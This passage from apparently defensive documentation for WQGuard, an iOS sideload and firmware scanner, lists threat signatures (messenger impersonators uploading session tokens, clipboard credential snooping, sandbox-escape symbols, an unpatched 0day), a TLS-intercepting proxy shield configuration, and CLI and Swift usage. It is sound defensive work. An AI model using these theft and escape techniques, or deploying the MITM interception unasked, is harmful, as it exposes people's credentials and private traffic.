- **Remediation**: **CRITICAL DANGER**. Never enter seed phrases into sideloaded wallet apps. Install wallets exclusively from the official Apple App Store.

#### `EXP-06`: Repackaged Encrypted Messenger Impersonation
- **Identifier**: `EXP-06:MessengerImpersonation`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 Bundle & Identity Inspector (word-token & dot-delimited boundary matcher)
- **Technical Description**: Sideloaded or enterprise package (`cryptid == 0`) impersonating Telegram or other secure messengers (matched on exact token/dot boundaries so unrelated developer apps like `NetGuard`, `PostgREST`, or `GitGraph` never false-positive).
- **Exploit Path**: Modified client uploading session tokens (`session.dat`), chat histories, and 2FA SMS codes to third-party servers.
- **Remediation**: Delete immediately. Revoke active Telegram sessions from official desktop/mobile clients.

#### `EXP-07`: Injected Dynamic Tweak & Hooking Framework Enumeration
- **Identifier**: `EXP-07:InjectedTweaks`
- **Severity**: `MEDIUM` (`RiskTier.caution`)
- **Detection Layer**: Layer 2 Static Scanner (`LC_LOAD_DYLIB`, `Frameworks/`, `Dylibs/`, `DynamicLibraries/`, `PlugIns/*.appex`, `Extensions/*.appex`)
- **Technical Description**: Mach-O binary or bundle contains hooking frameworks (`ElleKit`, `CydiaSubstrate`, `libsubstitute`, `libhooker`), dedicated sideload injection libraries (`.app/Dylibs/*.dylib`, `.app/DynamicLibraries/*.dylib` used by Feather / Cyan / Azule), or suspicious `@executable_path/` / `@rpath/` tweaks.
- **Exploit Path**: Sideloaded modded IPA with injected dylibs capable of runtime method swizzling and credential interception.
- **Remediation**: Audit injected dylib list displayed in WQGuard findings. Under strict zero-trust policy, verify every injected dylib independently before installing.

#### `EXP-08`: Background Clipboard Snooping Tuple & Rogue Supervision
- **Identifier**: `EXP-08:ClipboardSnooping` / `EXP-08:FakeSupervision`
- **Severity**: `HIGH` (`RiskTier.highRisk`)
- **Detection Layer**: Layer 2 / Layer 3 Multilayer Evaluator
- **Technical Description**: 
  - (A) App declares persistent background modes (`audio`, `location`, `voip`) in `Info.plist` and imports `UIPasteboard` / `generalPasteboard`.
  - (B) `systemgroup.com.apple.configurationprofiles` contains `CloudConfigurationDetails.plist` with `IsSupervised == true`.
- **Exploit Path**:
  - (A) Continuously monitors system pasteboard in the background to harvest copied crypto addresses and passwords.
  - (B) Retail device fake supervision causing Infinite Setup Assistant Loops (SEC-M4-01).
- **Remediation**:
  - (A) Revoke background permissions and uninstall snooper app.
  - (B) WQGuard flags rogue `CloudConfigurationDetails.plist` artifacts strictly read-only (never mutating or deleting system files); back up user data and perform a clean restore via Finder / Apple Configurator if unauthorized supervision was applied.

---

### 3.3 Comprehensive Threat Signature Matrix

| Indicator ID | Name / Signature Pattern | Severity | Risk Tier | Detection Layer | Target Exploitation Vector |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **`CM-01`** | `DYLIB_CONTAINERMANAGER` | `HIGH` | `highRisk` | Layer 2 | `containermanagerd` IPC linkage |
| **`CM-02`** | `SYM_CONTAINER_APIS` (`container_query_*`) | `HIGH` | `highRisk` | Layer 2 | `worse_query` query & token calls |
| **`CM-03`** | `XPC_CONTAINERMANAGERD` | `HIGH` | `highRisk` | Layer 2 | Direct XPC daemon bypass |
| **`CM-04`** | `SYM_SANDBOX_EXTENSION_CONSUME` | `HIGH` | `highRisk` | Layer 2 | Kernel Seatbelt extension consume |
| **`CM-05`** | `SYM_FSGETPATH` / `pathleak` | `HIGH` | `highRisk` | Layer 2 | APFS inode container reconnaissance |
| **`CM-06`** | `CONTAINER_ESCAPING_SYMLINK` | `HIGH` | `highRisk` | Layer 3 | Persistent cross-container tunnel |
| **`CM-07`** | `TUPLE_OBFUSCATED_EXPLOIT` | `HIGH` | `highRisk` | Layer 2 | Obfuscated / stripped exploit binary |
| **`EXP-01`** | `PhotoLibraryServices.framework` | `HIGH` | `highRisk` | Layer 2 | `CVE-2026-112676` Photos TCC bypass |
| **`EXP-02`** | `PLPhotoLibrary` Symbol | `HIGH` | `highRisk` | Layer 2 | Silent photos library extraction |
| **`EXP-03`** | `com.apple.private.photos.*` | `HIGH` | `highRisk` | Layer 1 | Private photos authorization grant |
| **`EXP-04`** | `libbrotli` / `BrotliDecoder` | `MEDIUM` | `caution` | Layer 2 | `CVE-2026-111497` supply chain OOB |
| **`EXP-05`** | `IMPERSONATION:Wallet` | `HIGH` | `highRisk` | Layer 2 | Crypto drainer / seed phrase theft |
| **`EXP-06`** | `IMPERSONATION:Telegram` | `HIGH` | `highRisk` | Layer 2 | Session hijacking / eavesdropping |
| **`EXP-07`** | `ElleKit` / Injected Tweaks | `MEDIUM` | `caution` | Layer 2 | Runtime method hooking / modded IPA |
| **`EXP-08`** | `UIBackgroundModes` + `UIPasteboard` | `HIGH` | `highRisk` | L2 / L3 | Background clipboard credential snoop |

---

## 4. Firmware CVE Exposure Radar & Non-Upgrade Posture Mitigations

Many iOS power users and security researchers intentionally stay on older firmware versions (e.g., iOS 26.x or iOS 27.0–27.2) for TrollStore compatibility, MobileGestalt exploration, or jailbreak research. Upgrading to the latest iOS release is not an option for these users.

WQGuard's **`FirmwarePostureEngine`** evaluates the host OS version against 8 confirmed 2026 iOS vulnerabilities and delivers **actionable non-upgrade mitigations**.

### 4.1 2026 Firmware CVE Exposure Radar Matrix

| CVE / Identifier | Vulnerability Name | Subsystem | CVSS | Affected iOS Range | Patched In |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **`0day:worse_query`** | `containermanagerd` Token Escape | Containermanager | **8.8** | iOS 26.0 – 27.2.1+ | **Unpatched 0day** |
| **`CVE-2026-112676`** | Apple Photos Privacy TCC Bypass | Photos / TCC | **7.5** | iOS < 27.2 & 26 < 26.7.2 | iOS 27.2 / 26.7.2 |
| **`CVE-2026-111497`** | Brotli Decoder Heap OOB Write | libbrotli / WebKit | **9.2** | iOS < 27.2.1 & 26 < 26.7.3 | iOS 27.2.1 / 26.7.3 |
| **`CVE-2026-112611`** | CoreGraphics PDF OOB Write | CoreGraphics / PDFKit| **8.8** | iOS < 27.2 & 26 < 26.7.2 | iOS 27.2 / 26.7.2 |
| **`CVE-2026-86950`** | CoreGraphics 2D Memory Corruption | CoreGraphics / Quartz| **8.6** | iOS 26 < 26.7.1 & 18 < 18.7.11 | iOS 27.0 / 26.7.1 / 18.7.11 |
| **`CVE-2026-113963`** | App Intents Authorization Bypass | Shortcuts / Intents | **7.8** | iOS < 27.2.1 & 26 < 26.7.3 | iOS 27.2.1 / 26.7.3 |
| **`CVE-2026-113960/1`**| iMessage Blastdoor Group Leak | Messages / Blastdoor | **8.1** | iOS < 27.2.1 & 26 < 26.7.3 | iOS 27.2.1 / 26.7.3 |
| **`CVE-2026-113964–70`**| Bluetooth CoreUtils & AirPlay UAF| Bluetooth / rapportd | **8.8** | iOS < 27.2.1 & 26 < 26.7.3 | iOS 27.2.1 / 26.7.3 |

---

### 4.2 Multi-Client Brotli Shield Architecture (CVE-2026-111497 / HTTP2Shell)
`CVE-2026-111497` (CVSS 9.2) is a critical heap buffer overflow in `c/dec/decode.c` within `libbrotli`. Malicious web servers or network-level attackers serving HTTP/1.1 or HTTP/2 streams can deliver a weaponized `Content-Encoding: br` payload that triggers remote code execution (RCE) in CFNetwork and WebKit processes.

WQGuard provides ready-to-import shield profiles across **Surge (`.sgmodule`), Shadowrocket (`.module`), Quantumult X (`.conf`), Loon (`.plugin`), and Stash (`.stoverride`)** under `Shields/` (e.g., `Shields/Surge/WQGuard-Brotli-Shield.sgmodule`):

```ini
#!name=WQGuard · 防 Brotli 溢出降级护盾 (CVE-2026-111497)
#!desc=针对 iOS 26.x 与 iOS 27.0–27.2.0 系统未修复之 libbrotli 堆越界写高危漏洞 (CVE-2026-111497 / HTTP2Shell, CVSS 9.2)，在网络传输层剥离 Accept-Encoding 中的 br 算法强制降级为 gzip/deflate。内置 16 项严苛负向排除规则，确保 Apple Intelligence、普通话 Siri、iCloud 与网银支付绝对不被拦截。
#!version=1.2.1
#!category=安全防护
#!arguments=EXTRA_MITM_HOSTS:*.example.invalid
#!arguments-desc=可追加需要强制 Brotli 降级保护的高风险自定义域名（支持通配符如 *.example.com；如需保护全部 Safari/WebView 流量可填入 *，内置排除列表已保护 Apple 核心服务与金融应用）。

[Header Rewrite]
# 强制剥离客户端请求中的 br 压缩声明，降级至安全的 gzip 与 deflate 编码
^https?:// header-replace Accept-Encoding "gzip, deflate"

[Script]
# 零解压（requires-body=false）拦截不遵从客户端协商、强行回传 Content-Encoding: br 的恶意服务端响应
brotli-response-guard = type=http-response,pattern=^https?://.+,requires-body=false,max-size=0,script-path=https://raw.githubusercontent.com/Kianuni/WQGuard/main/Shields/scripts/brotli-guard.js

[MITM]
hostname = %APPEND% -*.apple.com, -*.icloud.com, -*.icloud-content.com, -*.mzstatic.com, -*.cdn-apple.com, -guzzoni.apple.com, -*.siri.apple.com, -gspe1-ssl.ls.apple.com, -apple-relay.*, -cp4.cloudflare.com, -*.openai.com, -*.chatgpt.com, -*.binance.com, -*.okx.com, -*.tenpay.com, -*.alipay.com, *.xyz, *.top, *.icu, *.cyou, *.sbs, *.cfd, *.buzz, *.fun, *.click, *.link, *.site, *.online, *.shop, *.vip, *.pw, *.work, *.rest, *.monster, *.quest, *.zip, *.mov, {{{EXTRA_MITM_HOSTS}}}
```

#### Dual Defense Layers & Protocol Boundaries:
1. **Request Header Replace**: Rewrites client `Accept-Encoding` to `gzip, deflate` so compliant origins serve gzip/deflate instead of Brotli.
2. **Response Script Guard (`brotli-guard.js`)**: Executes in `http-response` (`requires-body=false`) mode and returns a top-level `{ status: 403, headers: { "Content-Length": "0", "Connection": "close" } }` circuit-breaker response (or `HTTP/1.1 403 Forbidden` on Quantumult X `script-response-header`) without touching or decompressing a single body byte.
3. **Explicit Protocol Scope**: By default, MITM targets 21 high-abuse TLDs (`*.xyz` .. `*.mov`) for zero daily overhead; set `EXTRA_MITM_HOSTS = *` to cover `.com` / `.net` browsing as well. Note that **WebKit CSS `@font-face` `.woff2` font decoding (which embeds Brotli internally) and unintercepted HTTP/3 QUIC streams** are not governed by HTTP `Accept-Encoding` — for high-risk targeted threat models, pair this shield with **iOS Lockdown Mode** (Section 4.4, which disables custom WOFF2 font rendering) and block UDP 443 / QUIC in your proxy client.

---

### 4.3 Mandatory Negative MITM Exclusions (Protecting Siri & Apple Intelligence)
Surge MITM decrypts TLS traffic. However, **intercepting Apple core infrastructure breaks Private Cloud Compute (PCC), Siri, and Certificate-Pinned banking apps**.

WQGuard's Surge module enforces **16 mandatory negative exclusions** (`-%APPEND%`):
1. `-*.apple.com`: Prevents breaking system updates, App Store, and Apple ID authentication.
2. `-*.icloud.com`: Prevents breaking CloudKit data synchronization.
3. `-*.icloud-content.com`: Prevents photo and iCloud Drive download failures.
4. `-*.mzstatic.com`: Prevents App Store asset delivery failures.
5. `-*.cdn-apple.com`: Prevents firmware and system asset failures.
6. `-guzzoni.apple.com`: **Mandatory for Mandarin & Global Siri**. Intercepting Guzzoni terminates voice recognition.
7. `-*.siri.apple.com`: Voice model and intent processing.
8. `-gspe1-ssl.ls.apple.com`: Apple Maps location services.
9. `-apple-relay.*`: **Apple Private Cloud Compute (PCC) & iCloud Private Relay**. MITM triggers TLS pinning panic.
10. `-cp4.cloudflare.com`: Apple Private Relay Cloudflare ingress.
11. `-*.openai.com`: External intelligence models queried by Apple Intelligence.
12. `-*.chatgpt.com`: ChatGPT Siri integration endpoints.
13. `-*.binance.com`: Strict certificate pinning on crypto trading endpoints.
14. `-*.okx.com`: Strict certificate pinning on OKX exchange.
15. `-*.tenpay.com`: WeChat Pay TLS cert-pinned infrastructure.
16. `-*.alipay.com`: Alipay financial security authentication.

---

### 4.4 iOS Lockdown Mode Deployment & Hardening
For users on iOS < 27.2.1 who cannot patch `CVE-2026-111497` or `CVE-2026-112611`, Apple's **Lockdown Mode (锁定模式)** provides operating system-level shielding:
- **WebKit Protections**: Disables Just-in-Time (JIT) JavaScript compilation, WebGL, and complex SVG rendering.
- **Message Protections**: Blocks most message attachments other than standard images. Disables link previews.
- **Device Connections**: Blocks wired USB accessories when the iPhone is locked.
- **Deployment**:
  ```
  Settings -> Privacy & Security -> Lockdown Mode -> Turn On Lockdown Mode
  ```

---

### 4.5 System Services Hardening (AirDrop, Bluetooth, iMessage)
Users remaining on unpatched iOS releases should configure the following system settings:
1. **Bluetooth Hardening (`CVE-2026-113964–70`)**:
   - In crowded public transit or airports, turn Bluetooth off via **`Settings -> Bluetooth`** (not Control Center, which leaves proximity daemons active).
2. **AirPlay & Continuity (`rapportd` UAF)**:
   - Navigate to `Settings -> General -> AirPlay & Continuity`.
   - Set **"Automatically AirPlay to TVs"** to **Never**.
3. **iMessage Blastdoor Defense (`CVE-2026-113960/1`)**:
   - Navigate to `Settings -> Messages`.
   - Enable **"Filter Unknown Senders"**.
   - Do not share sensitive recovery keys in group messages.
4. **Messenger Auto-Download Hardening (`CVE-2026-112611` PDF OOB)**:
   - **Telegram**: `Settings -> Data and Storage -> Automatic media download -> When connected to Wi-Fi / Cellular` -> Disable Files and Documents.
   - **WeChat**: `Settings -> General -> Photos, Videos, Files & Calls` -> Disable Auto-Download.

---

## 5. CLI & Library Advanced Usage

### 5.1 wqguard-cli Command-Line Manual & Argument Matrix
`wqguard-cli` is a compiled Darwin host executable providing high-performance headless scanning for macOS terminal users and automated CI pipelines.

```
OVERVIEW: WQGuard CLI - 100% Read-Only iOS Security Scanner
USAGE: wqguard-cli [options]

OPTIONS:
  -s, --scan-system
        Scan installed applications on current machine/target using
        SecurityPipeline and LaunchServices CSStore2 caches.

  -i, --ipa <path>
        Inspect local uninstalled .ipa archive using IPAPackageScanner.

  -c, --container <path>
        Inspect AppGroup container directory using ContainerScanner.

  -r, --firmware-radar [os_version]
        Evaluate OS version against 8 2026 CVEs (e.g., Photos bypass,
        Brotli OOB RCE, worse_query 0day) using FirmwarePostureEngine.
        If os_version is omitted, current device OS version is used.

  --export-shield <path>
        Export multi-client Brotli downgrade shield auto-detected by extension
        (.sgmodule / .module / .conf / .plugin / .stoverride) with 16 negative
        host exclusions via SurgeBrotliShieldHelper.

  --export-surge <path>
        Export WQGuard-Brotli-Shield.sgmodule with 16 negative exclusions
        (protecting Apple Intelligence, Siri, and banking) via SurgeBrotliShieldHelper.

  --format <text|json|markdown>
        Report format output (default: text).

  -o, --out <path>
        Write report to file path instead of standard output.

  --whitelist <bundleID>
        Temporarily whitelist specific bundle ID for this scan run (repeatable).

  -v, --version
        Print CLI engine version information.

  -h, --help
        Show this help manual.

EXIT CODES:
  0     Scan completed with no High Risk findings (clean, safe, or whitelisted).
  1     High Risk findings detected (RiskTier.highRisk).
  2     Usage error, invalid arguments, or missing target file.
```

---

### 5.2 Terminal Styler, Live Progress Bars & Exit Codes

#### Standard Exit Codes:
- `0`: Scan finished successfully. Target is classified as `SAFE`, `CAUTION`, or `KNOWN_TOOL`. No unwhitelisted `HIGH_RISK` findings detected.
- `1`: High Risk findings detected (`RiskTier.highRisk`). Indicates malicious exploit code, escaping symlinks, impersonation trojans, or vulnerable firmware exposure.
- `2`: Fatal execution error: invalid CLI arguments, file not found, corrupted archive, or permission denied.

#### ANSI Terminal Styler:
`wqguard-cli` automatically detects TTY status via `isatty(STDOUT_FILENO)`. When running interactively:
- Risk tiers are styled with ANSI color sequences (Red for High Risk, Yellow for Caution, Green for Safe, Cyan for Known Tool).
- Live progress is rendered to `stderr` with progress bars (`[=====>     ] 50.0%`).
- Progress output is suppressed when piped (`|`) or redirected to files (`>`), ensuring machine-parseable stdout.

---

### 5.3 Automated Auditing & Shell Scripting Examples

#### Example 1: Sideloading Gatekeeper Script
Block IPA installation if WQGuard detects high-risk exploit signatures:
```bash
#!/usr/bin/env bash
set -euo pipefail

IPA_PATH="$1"
echo "[*] Auditing ${IPA_PATH} with WQGuard..."

if wqguard-cli --ipa "${IPA_PATH}" --format text; then
    echo "[+] Audit passed: No High Risk signatures detected. Proceeding to sideload."
    # ideviceinstaller -i "${IPA_PATH}"
else
    EXIT_CODE=$?
    if [ ${EXIT_CODE} -eq 1 ]; then
        echo "[!] CRITICAL: WQGuard blocked installation! High-risk exploit or drainer detected."
    else
        echo "[!] ERROR: WQGuard failed to process the archive."
    fi
    exit ${EXIT_CODE}
fi
```

#### Example 2: Batch Directory Scanning & JSON Extraction
Scan an entire directory of IPAs and extract all flagged bundle IDs using `jq`:
```bash
#!/usr/bin/env bash
for ipa in ./downloads/*.ipa; do
    REPORT="./reports/$(basename "${ipa}").json"
    wqguard-cli --ipa "${ipa}" --format json -o "${REPORT}" || true
done

# Extract all apps flagged as HIGH_RISK
jq -r '.findings[] | select(.riskTier == "HIGH_RISK") | "\(.bundleId) - \(.displayName): \(.evidence.remediationGuidance)"' ./reports/*.json
```

#### Example 3: Automated Firmware Exposure Verification in CI
```bash
# Verify firmware posture for an iOS 26.2 test runner
wqguard-cli --firmware-radar 26.2 --format json -o ./firmware_report.json
EXPOSED_COUNT=$(jq '.exposedCount' ./firmware_report.json)
echo "[*] iOS 26.2 has ${EXPOSED_COUNT} unpatched firmware CVE exposures."
```

---

### 5.4 Swift Package Library Integration (WQGuardCore)
Developers building custom security tools or enterprise MDM scanners can integrate `WQGuardCore` directly via Swift Package Manager:

#### 1. Package Dependency (`Package.swift`):
```swift
dependencies: [
    .package(path: "../WQGuard")
],
targets: [
    .target(
        name: "EnterpriseScanner",
        dependencies: [
            .product(name: "WQGuardCore", package: "WQGuard")
        ]
    )
]
```

#### 2. Scanning an IPA Package:
```swift
import Foundation
import WQGuardCore

let ipaURL = URL(fileURLWithPath: "/path/to/suspicious.ipa")
do {
    let finding: ScanFinding = try SecurityPipeline.shared.scanIPA(at: ipaURL)
    print("Bundle ID: \(finding.bundleId)")
    print("Risk Tier: \(finding.riskTier.localizedNameEn)")
    for indicator in finding.indicators {
        print("  - [\(indicator.severity)] \(indicator.signature): \(indicator.description)")
    }
} catch {
    print("Scan failed: \(error)")
}
```

#### 3. Asynchronous System Scan with Progress Callback:
```swift
import WQGuardCore

Task {
    let findings = try await SecurityPipeline.shared.scanInstalledAppsAsync { progress in
        print("Scanning: \(progress.currentTarget) [\(progress.completedCount)/\(progress.totalCount)]")
    }
    let session = ScanSession(findings: findings)
    let jsonReport = try ReportGenerator.shared.generateJSONReportString(session: session)
    print(jsonReport)
}
```

#### 4. Custom Whitelist Registration:
```swift
import WQGuardCore

let customAuditTool = WhitelistedTool(
    name: "InternalSecurityTool",
    allowedBundleIds: ["com.enterprise.sectool"],
    allowedAppGroups: ["group.com.enterprise.sectool"],
    expectedSignatures: ["container_query_create", "libsystem_containermanager.dylib"],
    description: "Authorized corporate penetration testing tool",
    isEnabled: true,
    isBuiltIn: false
)

WhitelistEngine.shared.registerCustomTool(customAuditTool)
```

---

## 6. Official Identifiers, Entitlements & Open-Source Governance

### 6.1 Production Bundle Identifiers & App Groups
WQGuard adheres to strict vendor-neutral, production-grade identity standards across all build targets:
- **Application Bundle Identifier**: `com.wqguard.app`
- **Primary App Group Identifier**: `group.com.wqguard.app`
- **Dedicated RAII Scanner App Group**: `group.com.wqguard.scanner` (used for isolated, zero-leak sandbox token acquisition under SEC-M5-02)

| Component | Identifier | Purpose | Declared In |
|:---|:---|:---|:---|
| **Main iOS App** | `com.wqguard.app` | Primary SwiftUI application bundle ID | `WQGuard.xcodeproj`, `Info.plist` |
| **Primary App Group** | `group.com.wqguard.app` | Shared container for scan reports & state | `WQGuard.entitlements` |
| **Dedicated Scanner Group** | `group.com.wqguard.scanner` | Dedicated container for scoped read-only queries | `WhitelistEngine.swift` |

### 6.2 Third-Party Identity Isolation & Strict Zero-Trust Sideload Policy
- **Strict Zero-Trust Default Whitelist**: By default, `WhitelistEngine.swift` whitelists **only `WQGuard` itself** (`com.wqguard.app` with exact App Group verification AND a strict read-only self-scan `expectedSignatures` subset check — any Trojanized binary carrying `container_copy_sandbox_token`, `fsgetpath`, or `libsystem_containermanager.dylib` under `com.wqguard.app` is immediately rejected).
- **Zero Implicit Exemptions for Third-Party Sideloading Tools**: Third-party sideload signers, certificate managers, and loopback debuggers (`Feather`, `SideStore`, `AltStore`, `全能签 / ESign`, `GBox`, `Scarlet`, `LocalDevVPN`, `StikDebug`) are **never auto-whitelisted** (`isWhitelisted == false`), surfacing transparently as `Caution` (`🟠`) or `High Risk` (`🔴`) unless a user explicitly registers a local custom rule.
- **Portability & Hygiene**: Zero personal machine paths (e.g., `/Users/<username>/`), private author emails, or local hostnames exist within WQGuard distribution artifacts, test suites, or CI pipelines.
